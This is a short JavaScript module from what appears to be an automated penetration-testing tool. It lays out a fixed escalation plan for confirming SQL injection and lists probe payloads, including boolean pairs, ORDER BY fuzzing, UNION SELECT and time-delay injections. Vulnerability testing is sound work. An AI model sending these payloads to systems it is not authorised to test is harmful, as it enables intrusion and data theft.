/**
 * sqlEscalator.js
 * 
 * Deterministic escalation chain for SQL Injection.
 * Eliminates the need for prompt-based guessing by chaining
 * boolean logic, UNION tests, and time-based delays.
 */

export function escalateSQLi(baselineResponse, injectedResponse, evidencePattern) {
    const escalationPlan = [
        "1. Required Boolean Proof: Run AND 1=1 vs AND 1=2 and demand consistent diff.",
        "2. Try ORDER BY Error Fuzzing: ORDER BY 1, ORDER BY 100",
        "3. Try UNION SELECT extraction test",
        "4. Try DB fingerprint payload to confirm backend (e.g., pg_sleep() vs WAITFOR DELAY)",
        "5. Confirm with time-based delay baseline"
    ];

    const nextPayloads = [
        "' AND 1=1--",
        "' AND 1=2--",
        "1 AND 1=1",
        "1 AND 1=2",
        "' ORDER BY 1--",
        "' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "1; WAITFOR DELAY '0:0:5'",
        "pg_sleep(5)"
    ];

    return {
        vulnType: "SQLi",
        requiresConfirmationTool: true, // e.g., run sqlmap eventually or strict script
        booleanPairsNeeded: [
            ["' AND 1=1--", "' AND 1=2--"],
            ["1 AND 1=1", "1 AND 1=2"]
        ],
        escalationPlan,
        nextPayloads
    };
}
